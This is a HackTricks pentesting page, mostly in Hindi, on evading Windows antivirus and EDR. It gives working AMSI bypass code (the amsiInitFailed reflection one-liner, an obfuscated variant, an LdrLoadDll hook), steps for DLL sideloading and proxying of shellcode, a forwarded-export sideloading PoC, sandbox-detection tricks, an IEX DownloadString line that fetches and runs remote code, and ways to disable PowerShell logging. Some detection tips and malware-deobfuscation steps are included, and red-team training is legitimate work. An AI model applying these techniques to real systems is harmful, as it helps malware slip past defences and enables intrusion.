# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने का एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): एक टूल जो किसी और AV का नाटक करके Windows Defender को काम करने से रोकता है।
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

वर्तमान में, AVs यह तय करने के लिए अलग-अलग तरीके उपयोग करते हैं कि कोई फ़ाइल malicious है या नहीं — static detection, dynamic analysis, और अधिक advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection उन जाने-पहचाने malicious strings या byte arrays को flag करके और फ़ाइल से जानकारी निकालकर हासिल की जाती है (जैसे file description, company name, digital signatures, icon, checksum, आदि)। इसका मतलब है कि सार्वजनिक तौर पर उपलब्ध tools का उपयोग करने पर आपको पकड़ना आसान हो सकता है, क्योंकि उन्हें शायद पहले से analyze करके malicious के रूप में चिन्हित किया गया होगा। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप binary को encrypt कर देते हैं, तो AV के लिए आपके प्रोग्राम को detect करना मुश्किल होगा, लेकिन आपको प्रोग्राम को memory में decrypt और run करने के लिए किसी loader की ज़रूरत पड़ेगी।

- **Obfuscation**

कभी-कभी बस अपने binary या script के कुछ strings बदल देने से AV से पार मिल जाता है, लेकिन यह उस चीज़ पर निर्भर करते हुए समय लेने वाला हो सकता है जिसे आप obfuscate करना चाह रहे हैं।

- **Custom tooling**

अगर आप अपने खुद के tools विकसित करते हैं, तो कोई known bad signature नहीं होगा, लेकिन इसके लिए बहुत समय और मेहनत चाहिए।

> [!TIP]
> Windows Defender की static detection के खिलाफ चेक करने का एक अच्छा तरीका है [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)। यह मूलतः फ़ाइल को कई segments में बाँटता है और फिर Defender को प्रत्येक segment अलग से scan करने देता है; इस तरह यह आपको बता सकता है कि आपके binary में कौन-कौन सी strings या bytes flagged हैं।

मैं सलाह दूँगा कि आप practical AV Evasion के बारे में यह [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) देखें।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपका binary किसी sandbox में चलाकर malicious activity पर नज़र रखता है (उदाहरण: browser के passwords decrypt करके पढ़ने की कोशिश करना, LSASS का minidump लेना, आदि)। इस हिस्से के साथ काम करना थोड़ा ज़्यादा tricky हो सकता है, लेकिन sandboxes से बचने के लिए आप कुछ चीज़ें कर सकते हैं।

- **Sleep before execution** लागू करने के तरीके पर निर्भर करते हुए, यह AV के dynamic analysis को bypass करने का एक अच्छा तरीका हो सकता है। AVs के पास फ़ाइलों को scan करने के लिए बहुत कम समय होता है ताकि यूज़र के workflow में बाधा न आए, इसलिए लंबे sleep का उपयोग binaries के analysis को बाधित कर सकता है। समस्या यह है कि कई AVs की sandboxes sleep को implement करने के तरीके पर निर्भर करके skip कर सकती हैं।
- **Checking machine's resources** आमतौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (उदा. < 2GB RAM), वरना वे यूज़र की मशीन को धीमा कर देते। आप यहाँ काफी creative भी हो सकते हैं, जैसे CPU के temperature या fan speeds जांचना — हर चीज़ sandbox में implement नहीं होगी।
- **Machine-specific checks** अगर आप किसी ऐसे यूज़र को टार्गेट करना चाहते हैं जिसकी workstation "contoso.local" domain से जुड़ी है, तो आप कंप्यूटर के domain की जाँच कर सकते हैं और अगर यह आपके specified से नहीं मिलता तो आपका प्रोग्राम exit कर सकता है।

पता चला है कि Microsoft Defender के Sandbox का computername HAL9TH है, इसलिए आप अपनी malware में detonation से पहले computer name की जाँच कर सकते हैं — अगर name HAL9TH से मेल खाता है तो आप समझ सकते हैं कि आप defender के sandbox के अंदर हैं और अपना प्रोग्राम exit कर सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के खिलाफ जाने के लिए [@mgeeky](https://twitter.com/mariuszbit) से कुछ और बहुत अच्छे सुझाव

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने पहले कहा है, **public tools** अंततः **detect हो ही जाते हैं**, तो आपको खुद से कुछ सवाल पूछने चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, **क्या आपको वास्तव में mimikatz का उपयोग करना जरूरी है**? या क्या आप कोई अन्य कम जाना-पहचाना प्रोजेक्ट इस्तेमाल कर सकते हैं जो LSASS dump भी करता हो।

सही जवाब शायद बाद वाला होगा। mimikatz को लें, यह शायद AVs और EDRs द्वारा सबसे ज़्यादा flagged टूल्स में से एक है; जबकि यह प्रोजेक्ट खुद काफी अच्छा है, AVs के चारों ओर काम करके बचने के लिए इसके साथ काम करना एक दुःस्वप्न हो सकता है, इसलिए जो आप करना चाहते हैं उसके लिए alternatives खोजें।

> [!TIP]
> जब आप अपने payloads को evasion के लिए modify कर रहे हों, तो सुनिश्चित करें कि defender में automatic sample submission बंद है, और कृपया, गंभीरता से, **DO NOT UPLOAD TO VIRUSTOTAL** अगर आपका लक्ष्य लम्बे समय में evasion प्राप्त करना है। अगर आप देखना चाहते हैं कि आपका payload किसी particular AV द्वारा detect होता है या नहीं, तो उसे एक VM पर install करें, automatic sample submission बंद करने की कोशिश करें, और वहाँ तब तक टेस्ट करें जब तक आप परिणाम से संतुष्ट न हों।

## EXEs vs DLLs

जहाँ भी सम्भव हो, हमेशा evasion के लिए **DLLs का उपयोग प्राथमिकता दें**, मेरे अनुभव में DLL files आम तौर पर **काफ़ी कम detect** और analyze होते हैं, इसलिए यह detection से बचने के लिए एक बहुत ही सरल चाल है (अगर आपका payload किसी तरह DLL के रूप में चल सकता हो तो)।

जैसा कि हम इस इमेज में देख सकते हैं, Havoc का एक DLL Payload antiscan.me में 4/26 detection rate दिखा रहा है, जबकि EXE payload का detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ tricks दिखाएँगे जो आप DLL files के साथ उपयोग कर सकते हैं ताकि आप बहुत ज़्यादा stealthier हो सकें।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा उपयोग किए जाने वाले DLL search order का फ़ायदा उठाता है, जहाँ attacker victim application और malicious payload(s) को एक साथ रखकर लक्ष्य करता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्न powershell script का उपयोग करके DLL Sideloading के प्रति susceptible programs की जाँच कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

मैं दृढ़ता से सुझाव देता हूँ कि आप खुद **DLL Hijackable/Sideloadable programs** का अन्वेषण करें; यह तकनीक यदि सही तरीके से की जाए तो काफी stealthy है, लेकिन यदि आप publicly known DLL Sideloadable programs का उपयोग करते हैं तो आसानी से पकड़े जा सकते हैं।

सिर्फ़ उस नाम की malicious DLL रख देने भर से जो किसी प्रोग्राम को लोड करने की उम्मीद होती है, आपका payload नहीं चलेगा, क्योंकि प्रोग्राम उस DLL के अंदर कुछ specific functions अपेक्षित करता है; इस समस्या को ठीक करने के लिए हम एक और तकनीक का उपयोग करेंगे जिसे **DLL Proxying/Forwarding** कहा जाता है।

**DLL Proxying** प्रोग्राम द्वारा की जाने वाली कॉल्स को proxy (और malicious) DLL से मूल DLL तक आगे बढ़ाता है, इस तरह प्रोग्राम की functionality बनी रहती है और यह आपके payload के execution को संभाल सकता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग कर रहा हूँ जो [@flangvik](https://twitter.com/Flangvik/) द्वारा है।

ये वे चरण हैं जिन्हें मैंने अपनाया:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम कमांड हमें 2 फ़ाइलें देगा: एक DLL स्रोत कोड टेम्पलेट, और मूल पुनर्नामित DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
ये परिणाम हैं:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं आपको **कठोरता से सुझाव देता हूँ** कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) देखें जो DLL Sideloading के बारे में है और साथ ही [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें, ताकि आप उन बातों को जो हमने अधिक गहराई से चर्चा की हैं बेहतर समझ सकें।

### Forwarded Exports (ForwardSideLoading) का दुरुपयोग

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: code की ओर संकेत करने की बजाय, export entry में ASCII string होती है जिसका स्वरूप `TargetDll.TargetFunc` होता है। जब कोई caller export को resolve करता है, तो Windows loader:

- यदि पहले से loaded नहीं है तो `TargetDll` को लोड करें
- उससे `TargetFunc` को resolve करें

समझने योग्य मुख्य व्यवहार:
- यदि `TargetDll` KnownDLL है, तो यह सुरक्षित KnownDLLs namespace से प्रदान किया जाता है (उदा., ntdll, kernelbase, ole32)।
- यदि `TargetDll` KnownDLL नहीं है, तो सामान्य DLL खोज क्रम उपयोग किया जाता है, जिसमें उस module की directory शामिल है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive सक्षम करता है: एक signed DLL खोजें जो किसी function को export करता है जो एक non-KnownDLL module नाम पर forward किया गया हो, फिर उस signed DLL को उसी directory में रखें साथ में एक attacker-controlled DLL जिसे forwarded target module के बिल्कुल उसी नाम से नामित किया गया हो। जब forwarded export invoke किया जाता है, loader forward को resolve करता है और उसी directory से आपका DLL लोड करता है, और आपका DllMain execute होता है।

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` KnownDLL नहीं है, इसलिए इसे सामान्य खोज क्रम के माध्यम से ढूँढकर लोड किया जाता है।

PoC (कॉपी-पेस्ट):
1) साइन किए गए सिस्टम DLL को एक लिखने योग्य फ़ोल्डर में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक malicious `NCRYPTPROV.dll` रखें। एक न्यूनतम DllMain कोड निष्पादन प्राप्त करने के लिए पर्याप्त है; DllMain को ट्रिगर करने के लिए forwarded function को लागू करने की आवश्यकता नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) साइन किए गए LOLBin के साथ फ़ॉरवर्ड को ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
प्रेक्षित व्यवहार:
- rundll32 (साइन किया हुआ) side-by-side `keyiso.dll` (साइन किया हुआ) को लोड करता है
- जब `KeyIsoSetAuditingInterface` को रिज़ॉल्व किया जा रहा है, तो लोडर फॉरवर्ड `NCRYPTPROV.SetAuditingInterface` का पालन करता है
- फिर लोडर `NCRYPTPROV.dll` को `C:\test` से लोड करता है और इसका `DllMain` निष्पादित करता है
- यदि `SetAuditingInterface` लागू नहीं है, तो आपको "missing API" त्रुटि केवल तब मिलेगी जब `DllMain` पहले ही चल चुका होगा

हंटिंग टिप्स:
- उन फॉरवर्ड किए गए एक्सपोर्ट्स पर ध्यान दें जहाँ लक्ष्य मॉड्यूल KnownDLL नहीं है। KnownDLLs इस स्थान पर सूचीबद्ध हैं: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- आप फॉरवर्ड किए गए एक्सपोर्ट्स को निम्नलिखित टूलिंग से सूचीबद्ध कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder इन्वेंटरी देखें ताकि उम्मीदवार खोज सकें: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins की निगरानी करें (e.g., rundll32.exe) जो non-system paths से signed DLLs लोड कर रहे हों, और फिर उसी डायरेक्टरी से उसी base name वाले non-KnownDLLs को लोड कर रहे हों
- निम्न process/module chains पर अलर्ट करें: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` जो user-writable paths के तहत हों
- code integrity नीतियाँ लागू करें (WDAC/AppLocker) और application directories में write+execute निषेध करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग अपने shellcode को लोड और execute करने के लिए गोपनीय तरीके से कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> इवेशन सिर्फ एक बिल्ली और चूहे का खेल है — जो आज काम करता है, वह कल पकड़ा जा सकता है, इसलिए कभी भी सिर्फ एक टूल पर निर्भर न रहें; जहाँ संभव हो, कई evasion techniques को चेन करने की कोशिश करें।

## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **files on disk** को स्कैन करने में सक्षम थे, इसलिए अगर आप payloads को किसी तरह **directly in-memory** execute कर पाते थे, तो AV कुछ भी करने में असमर्थ रहता क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus solutions को script व्यवहार की जाँच करने की अनुमति देता है क्योंकि यह script की contents को unencrypted और unobfuscated रूप में एक्सपोज़ करता है।

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` Windows Defender पर निम्न alert उत्पन्न करेगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को prepend करता है और फिर उस executable का path दिखाता है जिससे script चला था — इस मामले में, powershell.exe

हमने कोई file disk पर drop नहीं किया, फिर भी AMSI की वजह से in-memory पकड़े गए।

इसके अलावा, **.NET 4.8** से शुरू होकर, C# code भी AMSI के जरिए run किया जाता है। यह `Assembly.Load(byte[])` जैसी in-memory लोडिंग को भी प्रभावित करता है। इसलिए अगर आप AMSI से बचना चाहते हैं तो in-memory execution के लिए lower versions of .NET (जैसे 4.7.2 या उससे नीचे) का उपयोग करने की सिफारिश की जाती है।

There are a couple of ways to get around AMSI:

- **Obfuscation**

  चूँकि AMSI मुख्यतः static detections के साथ काम करता है, इसलिए जिन scripts को आप लोड करने की कोशिश करते हैं उन्हें modify करना detection से बचने का एक अच्छा तरीका हो सकता है।

  हालांकि, AMSI में scripts को unobfuscate करने की क्षमता होती है भले ही वे कई layers में हों, इसलिए obfuscation तरीका और उसकी गुणवत्ता पर निर्भर करते हुए यह खराब विकल्प भी हो सकता है। यह इसे आसान नहीं बनाता। हालांकि कभी-कभी बस कुछ variable names बदल देने से काम चल जाता है, इसलिए यह निर्भर करता है कि किसी चीज़ को कितना फ्लैग किया गया है।

- **AMSI Bypass**

  चूँकि AMSI को powershell (साथ ही cscript.exe, wscript.exe, आदि) process में एक DLL लोड करके लागू किया जाता है, इसे unprivileged user के रूप में भी आसानी से tamper किया जा सकता है। AMSI के implementation की इस कमी के कारण researchers ने AMSI scanning से बचने के कई तरीके खोज निकाले हैं।

**Forcing an Error**

AMSI के initialization को fail कराने पर (amsiInitFailed) वर्तमान process के लिए कोई scan initiate नहीं होगा। इसे मूल रूप से [Matt Graeber](https://twitter.com/mattifestation) ने डिस्क्लोज़ किया था और Microsoft ने इसके व्यापक उपयोग को रोकने के लिए एक signature विकसित किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
वर्तमान powershell process के लिए AMSI को अनुपयोगी करने के लिए केवल एक लाइन powershell कोड ही काफी थी। यह लाइन स्वाभाविक रूप से AMSI द्वारा फ्लैग की जा चुकी है, इसलिए इस technique को उपयोग में लाने के लिए कुछ संशोधन की आवश्यकता है।

नीचे एक संशोधित AMSI bypass दिया गया है जो मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें, यह पोस्ट प्रकाशित होते ही संभवतः फ्लैग हो जाएगा, इसलिए यदि आपका मकसद अनडिटेक्टेड रहना है तो कोई भी कोड प्रकाशित न करें।

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> कृपया अधिक विस्तृत व्याख्या के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI को ब्लॉक करना — amsi.dll लोड को रोकना (LdrLoadDll hook)

AMSI तभी आरम्भ होता है जब `amsi.dll` वर्तमान प्रोसेस में लोड हो चुका होता है। एक मजबूत, language‑agnostic bypass यह है कि `ntdll!LdrLoadDll` पर user‑mode hook लगाया जाए जो requested module `amsi.dll` होने पर error लौटाता है। नतीजतन, AMSI कभी लोड नहीं होता और उस प्रोसेस के लिए कोई स्कैन नहीं होता।

इम्प्लीमेंटेशन रूपरेखा (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- PowerShell, WScript/CScript और कस्टम लोडर्स दोनों पर समान रूप से काम करता है (कोई भी चीज़ जो AMSI को लोड करती)।
- लंबे कमांड‑लाइन अवशेषों से बचने के लिए stdin के माध्यम से स्क्रिप्ट फ़ीड करने के साथ उपयोग करें (`PowerShell.exe -NoProfile -NonInteractive -Command -`)।
- LOLBins के माध्यम से निष्पादित लोडर्स द्वारा उपयोग होते देखा गया है (उदा., `regsvr32` जो `DllRegisterServer` को कॉल करता है)।

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**डिटेक्ट की गई सिग्नेचर हटाएं**

आप **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे टूल्स का उपयोग कर सकते हैं ताकि वर्तमान प्रोसेस की मेमोरी से डिटेक्ट की गई AMSI सिग्नेचर हटाई जा सके। यह टूल वर्तमान प्रोसेस की मेमोरी में AMSI सिग्नेचर को स्कैन करके फिर उसे NOP निर्देशों से ओवरराइट करता है, जिससे वह प्रभावी रूप से मेमोरी से हटा दिया जाता है।

**AV/EDR उत्पाद जो AMSI का उपयोग करते हैं**

AV/EDR उत्पादों की सूची जो AMSI का उपयोग करते हैं आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** पर पा सकते हैं।

**PowerShell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपने स्क्रिप्ट बिना AMSI द्वारा स्कैन किए चला सकते हैं। आप ऐसा कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS लॉगिंग

PowerShell logging एक फीचर है जो आपको सिस्टम पर निष्पादित सभी PowerShell कमांड्स को लॉग करने की अनुमति देता है। यह ऑडिटिंग और ट्रबलशूटिंग के लिए उपयोगी हो सकता है, लेकिन यह उन हमलावरों के लिए भी एक **समस्या हो सकता है जो detection से बचना चाहते हैं**।

PowerShell logging को बायपास करने के लिए आप नीचे दिए गए तरीकों का उपयोग कर सकते हैं:

- **PowerShell Transcription और Module Logging को Disable करें**: आप इसके लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का उपयोग कर सकते हैं।
- **Powershell version 2 का उपयोग करें**: यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपनी स्क्रिप्ट्स को AMSI द्वारा स्कैन किए बिना चला सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Unmanaged Powershell Session का उपयोग करें**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करके defenses के बिना एक powershell spawn करें (यह वही है जो `powerpick` from Cobal Strike उपयोग करता है)।

## Obfuscation

> [!TIP]
> कई obfuscation techniques डेटा को encrypt करने पर निर्भर करती हैं, जिससे बाइनरी की entropy बढ़ जाएगी और AVs तथा EDRs के लिए इसे detect करना आसान हो जाएगा। इस बारे में सावधान रहें और संभव हो तो encryption केवल उन specific सेक्शन्स पर लागू करें जो संवेदनशील हैं या जिन्हें छुपाना आवश्यक है।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब आप ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का विश्लेषण करते हैं, तो अक्सर कई सुरक्षा परतें मिलती हैं जो decompilers और sandboxes को ब्लॉक कर देती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से एक near–original IL को **restore** करता है जिसे बाद में dnSpy या ILSpy जैसे टूल्स में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch कर देता है, इसलिए कोई भी modification binary को crash कर देगा। एन्क्रिप्टेड metadata tables को locate करने, XOR keys recover करने और एक clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होंगे जो अपना unpacker बनाने पर उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को फ़ीड करें:
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile चुनें  
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx direct method calls को lightweight wrappers (a.k.a *proxy calls*) से replace कर देता है ताकि decompilation और टूटे। इन्हें हटाने के लिए **ProxyCall-Remover** का उपयोग करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस चरण के बाद आपको opaque wrapper functions (`Class8.smethod_10`, …) की बजाय normal .NET API जैसे `Convert.FromBase64String` या `AES.Create()` दिखनी चाहिए।

4.  Manual clean-up – resulting binary को dnSpy में चलाएँ, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग के लिए search करें ताकि *real* payload का पता लग सके। अक्सर malware इसे TLV-encoded byte array के रूप में `<Module>.byte_0` के अंदर initialise करके store करता है।

ऊपर दिया गया chain execution flow को उस malicious sample को चलाए बिना **restore** कर देता है – यह offline workstation पर काम करते समय उपयोगी है।

> 🛈  ConfuserEx एक custom attribute `ConfusedByAttribute` उत्पन्न करता है जिसे IOC के रूप में उपयोग किया जा सकता है ताकि samples को automatic तरीके से triage किया जा सके।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य LLVM compilation suite का एक open-source fork प्रदान करना है जो code obfuscation और tamper-proofing के ज़रिए सॉफ़्टवेयर सुरक्षा बढ़ा सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator यह दिखाता है कि `C++11/14` भाषा का उपयोग करके, compile time पर, किसी भी external tool का उपयोग किए बिना और compiler को modify किए बिना obfuscated code कैसे generate किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा generate किए गए obfuscated operations की एक परत जोड़ता है, जो application को crack करने वाले व्यक्ति के लिए काम को थोड़ा कठिन बना देगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है जो विभिन्न प्रकार की pe files जैसे: .exe, .dll, .sys को obfuscate कर सकता है।
- [**metame**](https://github.com/a0rtega/metame): Metame एक साधारण metamorphic code engine है arbitrary executables के लिए।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक fine-grained code obfuscation framework है जो LLVM-supported भाषाओं के लिए ROP (return-oriented programming) का उपयोग करता है। ROPfuscator किसी प्रोग्राम को assembly code स्तर पर obfuscate करता है, सामान्य निर्देशों को ROP chains में बदलकर normal control flow की हमारी सामान्य धारणा को विफल कर देता है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim में लिखा गया एक .NET PE Crypter है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में convert करके फिर उन्हें load करने में सक्षम है।

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

